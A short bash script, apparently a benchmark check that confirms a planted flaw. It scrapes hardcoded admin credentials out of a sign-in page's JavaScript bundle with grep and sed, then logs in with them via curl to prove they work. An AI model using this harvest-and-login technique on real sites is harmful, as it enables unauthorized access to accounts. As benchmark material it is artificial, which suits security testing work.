#!/usr/bin/env bash
# CREDS-JS-001 (CWE-798/615): working seed credentials committed in a client
# component, shipped in the sign-in page's browser chunk. Harvest them from the
# bundle with no prior knowledge, then prove they authenticate.
set -e; . "$(dirname "$0")/_lib.sh"

BUNDLE="$(bundle_text /login)"
echo "$BUNDLE" | grep -q 'admin@bench.local'
PW=$(echo "$BUNDLE" | sed -n 's/.*admin@bench\.local[^A-Za-z0-9]*[^"]*"\([^"]*\)".*/\1/p' | head -1)
[ -n "$PW" ]
# the harvested pair is live, not a placeholder
CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$TARGET/api/auth/login" \
  -H 'content-type: application/json' \
  -d "{\"email\":\"admin@bench.local\",\"password\":\"$PW\"}")
[ "$CODE" = "200" ]
